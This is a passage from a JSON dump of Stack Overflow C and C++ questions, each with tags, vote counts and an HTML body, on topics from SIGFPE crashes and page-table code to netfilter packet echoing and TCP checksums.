LEAVE;\n    }\n}\n\nSV * get_stuff( void ) {\n    HV *stuff_hv;\n//    stuff_hv = (HV *)sv_2mortal((SV *)newHV());\n    stuff_hv = newHV();\n\n    if( NULL == hv_store( stuff_hv, \"SCRIPT_NAME\", strlen( \"SCRIPT_NAME\" ), newSVpv( \"\", 0 ), 0 ) ) {\n        croak( \"hv_store( 'SCRIPT_NAME' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"REQUEST_METHOD\", strlen( \"REQUEST_METHOD\" ), newSVpv( \"GET\", 3 ), 0 ) ) {\n        croak( \"hv_store( 'REQUEST_METHOD' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"REQUEST_URI\", strlen( \"REQUEST_URI\" ), newSVpv( \"/abc?def\", 8 ), 0 ) ) {\n        croak( \"hv_store( 'REQUEST_URI' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"PATH_INFO\", strlen( \"PATH_INFO\" ), newSVpv( \"/abc\", 4 ), 0 ) ) {\n        croak( \"hv_store( 'PATH_INFO' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"QUERY_STRING\", strlen( \"QUERY_STRING\" ), newSVpv( \"def\", 3 ), 0 ) ) {\n        croak( \"hv_store( 'QUERY_STRING' )\" );\n    }\n\n    return newRV_inc( (SV *)stuff_hv );\n}\n\nSV * call_stuff( SV *stuff_sv ) {\n    SV *response_sv;\n    int count;\n\n//  printf( \"REQUEST_URI = %s\\n\", SvPV_nolen( *hv_fetch( (HV *)SvRV( stuff_sv ), \"REQUEST_URI\", strlen( \"REQUEST_URI\" ), 0 ) ) );\n\n    dSP;\n    ENTER;\n    SAVETMPS;\n    PUSHMARK( SP );\n    XPUSHs( stuff_sv ); // stuff_sv is not mortal.\n    PUTBACK;\n    count = call_sv( app, G_EVAL | G_SCALAR | G_KEEPERR );\n    SPAGAIN;\n    if( SvTRUE( ERRSV ) ) {\n        response_sv = NULL;\n        fprintf( stderr, \"FATAL: %s\", SvPV_nolen( ERRSV ) );\n        /* CLEAR_ERRSV() is only available 5.8.9 or later */\n        if( SvMAGICAL( ERRSV ) ) {\n            mg_free( ERRSV );\n            mg_clear( ERRSV );\n        }\n        sv_setpvn_mg( ERRSV, \"\", 0 );\n        POPs; // causes \"warning: value computed is not used\"\n    }\n    else if( count &gt; 0 ) {\n        response_sv = POPs; // is this mortal?\n        SvREFCNT_inc( response_sv );\n    } else {\n        response_sv = NULL;\n    }\n\n    PUTBACK;\n    FREETMPS;\n    LEAVE;\n    return response_sv;\n}\n</code></pre>\n"},{"tags":["c","arrays","string","comma"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":41,"score":0,"question_id":13204876,"title":"Convert comma separated string to double","body":"<p>I would like to know if it's possible to convert at string like \"102.33, 220.44\" to an double[] in C and if so how it's done?</p>\n"},{"tags":["c","return"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":13205033,"title":"Return not ending method in c","body":"<p><em>edit - i figured out the arithmetic error but I still have the return error</em></p>\n\n<p>For some reason my program is giving me two errors. First error is that the \"return\" at the end of each of my methods() are not ending the method and bring me back to main. My second question is at line 23 where pfNum = mainSize/pageSize; is giving me a \"SIGFPE, arithmetic exception\" not sure why both of these are occuring can anyone help me out?</p>\n\n<p>Thanks</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\n/* Define page table as dynamic structure containing virtual page and page frame \n   and initialize variable as pointer to structure */\nstruct table{\n    int vp;\n    int pf;\n}*pageTable = NULL;\n/* Declare global var's */\nint mainSize,pageSize,policy,pfNum;\n/**********************************************************************/\nvoid option1(){\n/* Declare local var's */\n    int k;\n/* Prompt for main memory size, page size, and replacement policy */\n    printf(\"Enter main memory size(words): \");\n    scanf(\"%d\",&amp;mainSize);\n    printf(\"Enter page size(words/page): \");\n    scanf(\"%d\",&amp;pageSize);\n    printf(\"Enter replacement policy(0=LRU, 1=FIFO): \");\n    scanf(\"%d\",&amp;policy);\n    pfNum = mainSize/pageSize;\n/* Allocate and initialize page table based on number of entries */\n    pageTable = malloc(pfNum *sizeof(pageTable));\n    for(k=0;k&lt;pfNum;k++){\n        pageTable[k].vp=-1;\n        pageTable[k].pf=k;\n    }\nreturn;\n}\n/**********************************************************************/\nvoid option2(){\n/* Declare local var's */\n    int va,page,offset,i=0,temp;\n/* Prompt for virtual address */\n    printf(\"Enter virtual memory address to access: \");\n    scanf(\"%d\",&amp;va);\n/* Translate virtual mem addr to virtual page and offset*/\n    page = va/pageSize;\n    offset = va%pageSize;\n/* Check for end of table, unallocated entry, or matched entry in table \nand update table appropriately; while none of three cases, keep looping */\n\n    while(i&lt;pfNum &amp;&amp; pageTable[i].vp!=1 &amp;&amp; pageTable[i].vp!=page)\n        i++;\n    if(i&lt;=pfNum){\n        int j;\n        temp = pageTable[0].pf;\n        for(j=1;j&lt;pfNum;j++)\n            pageTable[j-1]=pageTable[j];\n        pageTable[j].vp=page;\n        pageTable[j].pf=temp;\n        printf(\"Page Fault!\");\n    }\n    else if(pageTable[i].vp==-1){\n        pageTable[i].vp = page;\n        printf(\"Page fault!\");\n    }\n    else if(pageTable[i].vp==page){\n        temp = pageTable[i].pf;\n        int l,address;\n        for(l=i+1;l&lt;pfNum-1;l++)\n            pageTable[l-1]=pageTable[l];\n        pageTable[l].vp = page;\n        pageTable[l].pf = temp;\n        address = (temp*pageSize)+offset;\n        printf(\"Virtual address %d maps to physical address %d\",va,address);\n    }\n return;\n}\n /**********************************************************************/\nvoid option3(){\n /* Declare local var's */\n    int u;\n    for(u=0;u&lt;pfNum;u++ &amp;&amp; pageTable[u].vp!=-1)\n        printf(\"VP %d --&gt; PF %d\",pageTable[u].vp,pageTable[u].pf);\n /* Print out each valid virtual page and page frame pair in table */\n\n return;\n}\n\n\n /**********************************************************************/\n int main(){\n /* Declare local var's */\n    int choice;\n /* Until user quits, print menu of options, prompt for user input, and select     appropriate option */\n    printf(\"/n\");\n    printf(\"Virtual memory to Main memory mapping:\\n\");\n    printf(\"--------------------------------------\\n\");\n    printf(\"1) Set parameters\\n\");\n    printf(\"2) Map virtual address\\n\");\n    printf(\"3) Print page table\\n\");\n    printf(\"4) Quit\\n\");\n    printf(\"\\n\");\n    printf(\"Enter Selection: \");\n    scanf(\"%d\",&amp;choice);\n    printf(\"\\n\");\n    while(choice!=4){\n        if(choice==1)\n            option1();\n        else if(choice==2){\n            option2();\n        }\n        else if(choice==3)\n            option3();\n    }\n    printf(\"Goodbye. Have a nice day.\");\nreturn 1;\n}\n</code></pre>\n"},{"tags":["c","macros","preprocessor","header-files","definition"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13205079,"title":"Do preprocessor macro definitions need to be in CAPS in a header file?","body":"<p>In the code I'm writing, I have been told to define a variable in a header file in the following way:</p>\n\n<pre><code>#define CLR_BLACK 0x0000\n</code></pre>\n\n<p>and since this is the only example I've been given, I was wondering whether all variables defined in a header file with the #define command need to be in caps. For example, would the following be valid?</p>\n\n<pre><code>#define videoBuffer (u16*)0x6000000\n</code></pre>\n\n<p>Thanks in advance for any help</p>\n"},{"tags":["c++","c","function","parameters","arguments"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":4,"view_count":177,"score":-1,"question_id":13147608,"title":"Need help understanding passing arguments to function","body":"<p>I’m new to C++ and unsure about how to pass arguments to functions.</p>\n\n<p>I’m using a function <code>Distance()</code> to calculate the distance between two nodes.\nI declare the function like this:</p>\n\n<pre><code>int Distance(int x1, int y1, int x2 , int y2)\n{   \n    int distance_x = x1-x2;\n    int distance_y = y1- y2; \n    int distance = sqrt((distance_x * distance_x) + (distance_y * distance_y));\n    return distance; \n}\n</code></pre>\n\n<p>In the main memory I have 2 <code>for</code> loops.\nWhat I need to know is if I can pass the values like this: <code>Distance (i, j, i+1, j+1)</code>.</p>\n\n<pre><code>for(int i = 0; i &lt; No_Max; i++)\n{\n    for(int j = 0; j &lt; No_Max; j++)\n    {\n        if(Distance(i, j, i+1, j+1) &lt;= Radio_Range) // the function \n            node_degree[i] = node_degree[i] + 1;\n\n        cout &lt;&lt; node_degree[i] &lt;&lt; endl;\n    }  \n}\n</code></pre>\n"},{"tags":["c","linux","gcc","elf","sigfpe"],"answer_count":2,"favorite_count":9,"up_vote_count":51,"down_vote_count":0,"view_count":1111,"score":51,"question_id":12570374,"title":"Floating point exception ( SIGFPE ) on 'int main(){ return(0); }'","body":"<p>I am trying to build a simple C program for two different Linux environments. On one device the program runs fine, on the other device the program generates a floating point exception. The program does nothing but return 0 from main which leads me to believe there is some incompatibility with the start-up code perhaps ABI?</p>\n\n<p>The program is compiled with gcc with the following build specs:</p>\n\n<blockquote>\n  <p>Using built-in specs. Target: i386-redhat-linux Configured with:\n  ../configure --prefix=/usr --mandir=/usr/share/man\n  --infodir=/usr/share/info --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-libgcj-multifile --enable-languages=c,c++,objc,obj-c++,java,fortran,ada --enable-java-awt=gtk --disable-dssi --disable-plugin --with-java-home=/usr/lib/jvm/java-1.4.2-gcj-1.4.2.0/jre --with-cpu=generic --host=i386-redhat-linux Thread model: posix gcc version 4.1.2 20080704 (Red Hat 4.1.2-52)</p>\n</blockquote>\n\n<p>The program source is the following:</p>\n\n<pre><code>int main()\n{\n        return(0);\n}\n</code></pre>\n\n<p>On the Celeron device this program generates the following under GDB:</p>\n\n<pre><code>[root@n00200C30AA2F jrn]# /jrn/gdb fail GNU gdb Red Hat Linux (5.3post-0.20021129.18rh) (gdb) run Starting program: /jrn/fail \n\nProgram received signal SIGFPE, Arithmetic exception. 0x40001cce in ?? () (gdb) bt\n#0  0x40001cce in ?? ()\n#1  0x4000c6b0 in ?? ()\n#2  0x40000cb5 in ?? ()\n</code></pre>\n\n<p>Below are the details that I can think to gather to help find out what is happening:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>CELERON:  ( fails on this device )\n2.6.8 #21 Mon Oct 1 11:41:47 PDT 2007 i686 i686 i386 GNU/Linux\n============\n[root@n00200C30AA2F proc]# cat cpuinfo \nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 9\nmodel name      : Intel(R) Celeron(R) M processor          600MHz\nstepping        : 5\ncpu MHz         : 599.925\ncache size      : 512 KB\nfdiv_bug        : no\nhlt_bug         : no\nf00f_bug        : no\ncoma_bug        : no\nfpu             : yes\nfpu_exception   : yes\ncpuid level     : 2\nwp              : yes\nflags           : fpu vme de pse tsc msr mce cx8 sep mtrr pge mca cmov pat clflush dts acpi mmx fxsr sse sse2 tm pbe\nbogomips        : 1179.64\n\nGNU C Library stable release version 2.3.2, by Roland McGrath et al.\nCompiled by GNU CC version 3.2.2 20030222 (Red Hat Linux 3.2.2-5).\nCompiled on a Linux 2.4.20 system on 2003-03-13.\nAvailable extensions:\n        GNU libio by Per Bothner\n        crypt add-on version 2.1 by Michael Glad and others\n        linuxthreads-0.10 by Xavier Leroy\n        BIND-8.2.3-T5B\n        libthread_db work sponsored by Alpha Processor Inc\n        NIS(YP)/NIS+ NSS modules 0.19 by Thorsten Kukuk\n\nATOM:  ( works fine on this device )\n2.6.35 #25 SMP Mon Mar 12 09:02:45 PDT 2012 i686 i686 i386 GNU/Linux\n==========\n[root@n00E04B36ECE5 ~]# cat /proc/cpuinfo \nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 28\nmodel name      : Genuine Intel(R) CPU N270   @ 1.60GHz\nstepping        : 2\ncpu MHz         : 1599.874\ncache size      : 512 KB\nfdiv_bug        : no\nhlt_bug         : no\nf00f_bug        : no\ncoma_bug        : no\nfpu             : yes\nfpu_exception   : yes\ncpuid level     : 10\nwp              : yes\nflags           : fpu vme de tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx constant_tsc up arch_perfmon pebs bts aperfmperf pni dtes64 monitor ds_cpl est tm2 ssse3 xtpr pdcm movbe lahf_lm\nbogomips        : 3199.74\nclflush size    : 64\ncache_alignment : 64\naddress sizes   : 32 bits physical, 32 bits virtual\npower management:\n\n\nGNU C Library stable release version 2.5, by Roland McGrath et al.\nCompiled by GNU CC version 4.1.2 20080704 (Red Hat 4.1.2-44).\nCompiled on a Linux 2.6.9 system on 2009-09-02.\nAvailable extensions:\n        The C stubs add-on version 2.1.2.\n        crypt add-on version 2.1 by Michael Glad and others\n        GNU Libidn by Simon Josefsson\n        GNU libio by Per Bothner\n        NIS(YP)/NIS+ NSS modules 0.19 by Thorsten Kukuk\n        Native POSIX Threads Library by Ulrich Drepper et al\n        BIND-8.2.3-T5B\n        RT using linux kernel aio\nThread-local storage support included.\n</code></pre>\n\n<p>What can I do to determine what is causing this problem?\nHow about trying to statically link against a certain version of libc?</p>\n\n<p>After failure occurs under GDB I execute:</p>\n\n<blockquote>\n<pre><code>(gdb) x/1i $eip\n0x40001cce:     divl   0x164(%ecx)\n</code></pre>\n</blockquote>\n\n<pre><code>(gdb) info reg\neax            0x6c994f 7117135\necx            0x40012858       1073817688\nedx            0x0      0\nebx            0x40012680       1073817216\nesp            0xbffff740       0xbffff740\nebp            0xbffff898       0xbffff898\nesi            0x8049580        134518144\nedi            0x400125cc       1073817036\neip            0x40001cce       0x40001cce\neflags         0x10246  66118\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x0      0\n(gdb) x/1wx 0x164+$ecx\n0x400129bc:     0x00000000\n(gdb) \n</code></pre>\n\n<p>Based on the help I've received it appears that for some reason the libc startup code is dividing by 0. </p>\n\n<p>The question now is, what is causing this obviously bad behavior? Something must be incompatible with something else? </p>\n\n<p><strong>Assembly output:</strong></p>\n\n<pre><code>[jrn@localhost ~]$ more fail.s\n        .file   \"fail.c\"\n        .text\n.globl main\n        .type   main, @function\nmain:\n        leal    4(%esp), %ecx\n        andl    $-16, %esp\n        pushl   -4(%ecx)\n        pushl   %ebp\n        movl    %esp, %ebp\n        pushl   %ecx\n        movl    $0, %eax\n        popl    %ecx\n        popl    %ebp\n        leal    -4(%ecx), %esp\n        ret\n        .size   main, .-main\n        .ident  \"GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-52)\"\n        .section        .note.GNU-stack,\"\",@progbits\n</code></pre>\n"},{"tags":["objective-c","c","cocoa","nsstring","nsinteger"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13204875,"title":"How do you check if an NSInteger is greater than another NSinteger?","body":"<p>I'm trying to write code that detects if an integer is greater than another integer. Is this possible?</p>\n\n<p>Here is what i've done so far.</p>\n\n<pre><code>if (NumCorrect &gt;&gt; NumWrong) {\n    btnCool.title = @\"Awww\";\n}\n\nelse {\n    btnCool.title = @\"Cool!\";\n}\n</code></pre>\n\n<p>All its doing is going to the else</p>\n\n<p><strong>EDIT:</strong></p>\n\n<pre><code>NSString *numCorrect = [NSString stringWithFormat:@\"%d\",NumCorrect];\nNSString *numWrong = [NSString stringWithFormat:@\"%d\", NumWrong];\nlblWrong.text = numWrong;\nlblCorrect.text = numCorrect;\nif (NumCorrect &gt; NumWrong) { \n    btnCool.title = @\"Awww\"; \n} else { \n    btnCool.title = @\"Cool!\"; \n}\n</code></pre>\n"},{"tags":["c++","c","execution-time"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":6,"view_count":116,"score":-4,"question_id":13203139,"title":"Examples of C programs with long execution time","body":"<p>Please suggest me some examples of C programs that have long execution time, apart from the usual sorting and recursion. I want to analyze the execution times of code and would like to use some programs that have considerable execution time, not just in milliseconds.</p>\n"},{"tags":["c","io"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13204712,"title":"How to translate cout/cins to printf/scanfs?","body":"<p>I coded an easy game. I know how to use cout/cin but having problems with printf/scanf. The code below works well with cout/cin. Question is, how to convert them into printf/scanf? Why the codes in comment don't work?</p>\n\n<p>Edit: I mean if I delete cout/cin lines and when I use printf/scanf instead it doesn't work properly.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;time.h&gt;\n\nusing namespace std;\n\nint main()\n{\n    srand(time(NULL));\n    int min=0, max=1000, guess, counter=0;\n    bool winner=false;\n    char answer;\n\n    while(counter&lt;10){\n        guess = rand()%(max-min)+min;\n        // printf(\"Did you pick %d? \\t\", guess);\n        // scanf(\"%c\", &amp;answer);\n        cout &lt;&lt; \"Did you pick \" &lt;&lt; guess &lt;&lt; \"?\\t\";\n        cin &gt;&gt; answer;\n        if(answer=='y'){ // yes\n            winner=true;\n            // printf(\"Computer wins.\\n\");\n            // printf(\"You picked: %d\", guess);\n            cout &lt;&lt; \"Computer wins.\" &lt;&lt; endl;\n            cout &lt;&lt; \"You picked: \" &lt;&lt; guess;\n            break;\n        }\n        else if(answer=='m'){ // more\n            min=guess;\n            counter++;\n        }\n        else if(answer=='l'){ // less\n            max=guess;\n            counter++;\n        }\n    }\n    if(winner==false){\n        // printf(\"User wins.\\n\");\n        cout &lt;&lt; \"User wins.\" &lt;&lt; endl;\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","pointers","multidimensional-array"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13197081,"title":"Swap multi-dimensional arrays in C++","body":"<p>(Note: I'm currently learning C++, so if there is a better way to do what I am doing, explanations would be helpful.)</p>\n\n<p>I am making Conway's Game of Life in C/C++ and have the following code:</p>\n\n<pre><code>bool ** previous;\nbool ** current;\n\nvoid init() {\n    previous = new bool*[width];\n    current = new bool*[width];\n    for (int i =0; i &lt; width; i++) {\n        previous[i] = new bool[height];\n        current[i] = new bool[height];\n    }\n}\n</code></pre>\n\n<p>The reason for the dynamic arrays is that the width and height are given by the user at runtime. If I had one-dimensional arrays, I could do the following:</p>\n\n<pre><code>bool * previous;\nbool * current;\n\nvoid () {\n    bool * temp = current;\n    current = previous;\n    previous = temp;\n}\n</code></pre>\n\n<p>However, this approach does not work as hoped with the two-dimensional array. As it is technically an array of arrays, do I have to swap each sub-array pointer individually? Is there a better way to go about defining multi-dimensional arrays and swapping them?</p>\n\n<p>Edit: I have yet to really use any C++ specific features, so if I can do this in pure C, I'd prefer that.</p>\n"},{"tags":["c","string","function","2d"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":13204198,"title":"Passing 2d array char into function","body":"<p>I'm trying to pass a 2D array with strings in it into a function. I keep getting the\nexpected expression before ] token.</p>\n\n<p>The point of this code is to read in a wordsearch puzzle, then find the words in that puzzle. I'm going to be writing a function for forward search, backword search, and then up and down search.</p>\n\n<p>How do I get rid of this error? The error is down at the very bottom where I call the forward function.</p>\n\n<pre><code>    /*Andrea Hatfield CPE 101 October 31st, 2012*/\n    #include &lt;stdio.h&gt;\n    #include &lt;string.h&gt;\n\n    int forward(char words[][8], char puzzle[][11]);\n\n\n    int main()\n    {\n    char puzzle[11][11];\n    char words[8][8];\n    FILE *fin, *fwords;\n    int i = 0;\n    int j= 0;\n\n    fin = fopen(\"puzzle.in\", \"r\"); \n    fwords = fopen(\"words.in\", \"r\");\n\n\n    if(fin == NULL) /*Reads in the puzzle file*/\n    printf(\"File does not exist\");\n    else\n    {\n            while(fscanf(fin,\"%s\", puzzle[i])!=EOF)\n            {\n                    printf(\"%s\\n\", puzzle[i]);\n                    i++;\n            }\n\n\n    }\n\n    if(fwords == NULL) /*Reads in the words the puzzle will search for */\n    printf(\"File does not exist\");\n    else\n    {\n            while(fscanf(fwords, \"%s\", words[j])!=EOF)\n            {\n                    printf(\"%s\\n\", words[j]);\n            }\n    }\n\n\n    forward(&amp;words[][8], &amp;puzzle[][11]); /*Error at this point*/\n    return(0);\n    }\n</code></pre>\n"},{"tags":["c","algorithm","binary","decimal"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":13201042,"title":"Decimal to binary algorithm in C","body":"<p>I am trying to use the following algorithm to convert a decimal number to a binary number in C. I don't understand why it doesn't work properly for some inputs (e.g. for 1993 I get 1420076519).</p>\n\n<pre><code>int aux=x;\nlong bin=0;\nwhile (aux&gt;0)\n{\n    bin=bin*10+aux%2;\n    aux=aux/2;\n}\nprintf(\"%d in decimal is %ld in binary.\", x, bin);\n</code></pre>\n"},{"tags":["c++","c","math","photoshop","blend"],"answer_count":1,"favorite_count":27,"up_vote_count":34,"down_vote_count":0,"view_count":5613,"score":34,"question_id":5919663,"title":"How does photoshop blend two images together?","body":"<p>Can somebody please explain to me the image manipulation behind how photoshop blends two images together so that I may reproduce the same affects in my application.</p>\n"},{"tags":["c++","c","gcc","g++","memory-alignment"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":68,"score":5,"question_id":13199593,"title":"How to use size of in __align__ for cache alignment, while using GCC?","body":"<p>I have two structs.</p>\n\n<pre><code>t_struct_inner {\n  int a;\n  ... // a lot more members\n}\n\nt_struct_outer {\n  t_struct_inner[1000] inners;\n  t_struct_outer* next;\n}\n</code></pre>\n\n<p>I malloc <code>t_struct_outer</code> in my code. I want <code>t_struct_inner</code> to be cache aligned. \nMy solution is to use  </p>\n\n<pre><code> __attribute__((aligned(\n       ((sizeof(t_struct_inner)/CACHE_LINE_SIZE)+1) * CACHE_LINE_SIZE\n)))\n</code></pre>\n\n<p>But obviously I cannot do this as I cannot use <code>sizeof</code> here. I do not want to hardcode a value for <code>aligned</code>.\nAny ideas how I can achieve the above?</p>\n"},{"tags":["c++","c","pointers"],"answer_count":32,"favorite_count":228,"up_vote_count":253,"down_vote_count":2,"view_count":17304,"score":251,"question_id":5727,"title":"What are the barriers to understanding pointers and what can be done to overcome them?","body":"<p>Why are pointers such a leading factor of confusion for many new, and even old, college level students in C or C++?  Are there any tools or thought processes that helped you understand how pointers work at the variable, function, and beyond level?</p>\n\n<p>What are some good practice things that can be done to bring somebody to the level of, \"Ah-hah, I got it,\" without getting them bogged down in the overall concept? Basically, drill like scenarios.</p>\n"},{"tags":["c++","c","algorithm","bit-manipulation","bit"],"answer_count":8,"favorite_count":2,"up_vote_count":8,"down_vote_count":0,"view_count":291,"score":8,"question_id":13116310,"title":"Fastest way to find up to 6 consecutive 0 bits in a char array","body":"<p>This is what I'm currently doing:</p>\n\n<pre><code>int dataLen = 500;\nchar data[dataLen];\nint desired = 1; // between 1 and 6, inclusive\n...\nchar bits[dataLen * 8];\nfor (int32 j = 0; j &lt; dataLen; j++) {\n    for (int i = 0; i &lt; 8; i++) {\n        bits[j*8+i] = ( (data[j] &amp; (1 &lt;&lt; (7-i))) ? '1' : '0' );\n    }\n}\nint offset = std::search_n(bits, bits + dataLen*8, desired, '0') - bits;\n</code></pre>\n\n<p>Really nasty, I know, and it's killing performance.</p>\n\n<p>What's the fastest way to find the bit offset of the first set of <code>x</code> consecutive 0 bits in a char array, where <code>0 &lt; x &lt; 7</code>? I'm on GCC with SSE 4.2 so builtins like __builtin_ctz, __builtin_popcountl are an option, I just can't figure out the best way to use them.</p>\n"},{"tags":["c","tcp","ip","freebsd","checksum"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":13203958,"title":"TCP checksum calculation for divert socket","body":"<p>I have a divert socket. I am trying to change the port on packets as I see them. When I do this - do I need to recalculate the TCP checksum, and the IP checksum?</p>\n\n<p>I am trying to do this, but I am seeing reset packets in tcpdump. I dont know if this is because I am calculating the tcp checksum wrong, or if its something else going on.</p>\n\n<p>I used the cksum methods from this site:</p>\n\n<p><a href=\"http://www.enderunix.org/docs/en/rawipspoof/\" rel=\"nofollow\">http://www.enderunix.org/docs/en/rawipspoof/</a></p>\n\n<p>I thought with using a divert socket, if I change one thing, it should be fairly straightforward, but doesnt seem to be. is there a TCP checksum calculator out there I can use to verify I am getting the right value?</p>\n"},{"tags":["c","declaration"],"answer_count":5,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":127,"score":8,"question_id":13085747,"title":"C function's declaration and definition in more than one source file","body":"<p>Here is the content of src1.c:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nextern int w;\n//int go(char); // no need to declare here. WHY????\n  main(){\n    char a='f';\n    go(a);\n    printf(\"%d\\n\", w);\n}\n</code></pre>\n\n<p>And here is the content of src2.c:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint w = 99;\nint go(char t){\n   printf(\"%c\\n%d\\n\",t,sizeof(t));\n}\n</code></pre>\n\n<p>Why isn't it mandatory to declare the <code>go</code> function in <code>src1.c</code> file after compiling it in Linux?</p>\n\n<pre><code> cc src1.c src2.c; \n</code></pre>\n\n<p>Does the compiler put the <code>go</code> function's definition from <code>src2.c</code> file above the main function's code so that declaration then would not be required? </p>\n\n<p>In I do it this way:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint go(char); // need to declare here, because if not, arguments of go will be promoted to intS and they would conflict with char parameters defined in go. Error is droped!\n  main(){\n    char a='f';\n    go(a);\n} \n  int go(char t){\n   printf(\"%c\\n%d\\n\",t,sizeof(t));\n}\n</code></pre>\n\n<p>So everyone that says, it is possible to pass whatever number and types of arguments in absence of prototype is wrong. They are promoted to <code>int</code>s in this case, but have to agree with those specified in definition.</p>\n\n<hr>\n\n<p>I did some tests and found out that even it compiles with no errors it does not work correctly.</p>\n\n<p>src1:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint go(int t){\n    printf(\"%d\\n%d\\n\",t,sizeof(t));\n}\n</code></pre>\n\n<p>sr2.c:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint go(int); //if I omit this prototype, program outputs 1 which is far from correct answer :)\nmain(){ \n    double b=33453.834;\n    go(b);\n}\n</code></pre>\n\n<p>So finally the answer could only be undefined behavior.</p>\n\n<p>Thanks Maxim Skurydin</p>\n"},{"tags":["c","linker","glibc"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":85,"score":5,"question_id":13204047,"title":"C program links to wrong version of function","body":"<p>I'm trying to debug an issue where the wrong version of a function gets called causing a segfault.  The code that I'm compiling is machine generated and includes a function called 'times' that does a complex multiply of it's two arguments.  This code is compiled to a .o before being linked into a higher level object file.</p>\n\n<p>When run this code segfaults and gdb indicates that it's in glibc's version of 'times' which doesn't even take the same number of arguments.  The are no instances of '#include  anywhere in this code.</p>\n\n<p>Changing the name of times to times1 resolves the problem.  This isn't a long term solution though due to the machine generated nature of the code and manually editing the name of this function all the time is unappealing.</p>\n\n<p>The whole mess compiles cleaning with -Wall so I'm not sure where to look.  Any ideas on how to resolve this?</p>\n\n<pre><code>Compile chain:\n    gcc -Wall -I. -g --shared -o dpd.o -fPIC *.c (mahine generated code here)\n    gcc -g --std=c99 -c -fpic getData.c -I/usr/local/include -L/usr/local/lib -lmatio -I/usr/local/include/iverilog -I$(MATLAB)\n    gcc -g -shared -o getData.vpi getData.o $(MATLAB)/dpd.o -lvpi -lmatio -L/usr/local/lib\n</code></pre>\n"},{"tags":["c","linux","linux-kernel","netfilter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13071054,"title":"How to echo a packet in kernel space using netfilter hooks?","body":"<p>I want to echo a packet in kernel space. I run an echo server on this machine with port 6000.\nNow a client runs on another machine sending data to the echo server. Now, what I want to do is to echo the packet back from the kernel space. I do not want to bother the server with the packet, and it will be echoed silently from the kernel space. I am presenting my codes below:</p>\n\n<pre><code>#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/skbuff.h&gt;\n#include &lt;linux/netfilter.h&gt;\n#include &lt;linux/netdevice.h&gt;\n#include &lt;linux/ip.h&gt;\n#include &lt;linux/udp.h&gt;\n#include &lt;linux/mm.h&gt;\n#include &lt;linux/err.h&gt;\n#include &lt;linux/crypto.h&gt;\n#include &lt;linux/init.h&gt;\n#include &lt;linux/crypto.h&gt;\n#include &lt;linux/scatterlist.h&gt;\n#include &lt;net/ip.h&gt;\n#include &lt;net/udp.h&gt;\n#include &lt;net/route.h&gt;\n#include &lt;net/checksum.h&gt;\n#include &lt;linux/netfilter_ipv4.h&gt;\n\n#define IP_HDR_LEN 20\n#define UDP_HDR_LEN 8\n#define TOT_HDR_LEN 28\n\nstatic unsigned int pkt_echo_begin(unsigned int hooknum,\n                        struct sk_buff *skb,\n                        const struct net_device *in,\n                        const struct net_device *out,\n                        int (*okfn)(struct sk_buff *));\n\nstatic struct nf_hook_ops pkt_echo_ops __read_mostly = {\n    .pf = NFPROTO_IPV4,\n    .priority = 1,\n    .hooknum = NF_INET_PRE_ROUTING,\n    .hook = pkt_echo_begin,\n};\n\nstatic int __init pkt_echo_init(void)\n{\n    printk(KERN_ALERT \"\\npkt_echo module started ...\");\n    return nf_register_hook(&amp;pkt_echo_ops);\n}\n\nstatic void __exit pkt_echo_exit(void)\n{\n    nf_unregister_hook(&amp;pkt_echo_ops);\n    printk(KERN_ALERT \"pkt_echo module stopped ...\");\n}\n\nstatic unsigned int pkt_echo_begin (unsigned int hooknum,\n                        struct sk_buff *skb,\n                        const struct net_device *in,\n                        const struct net_device *out,\n                        int (*okfn)(struct sk_buff *))\n{\n    struct iphdr *iph;\n    struct udphdr *udph;\n    unsigned char *data;\n\n    unsigned char *temp;\n\n    __u16 dst_port, src_port;\n    int data_len;\n\n\n\n    if (skb) {\n        iph = (struct 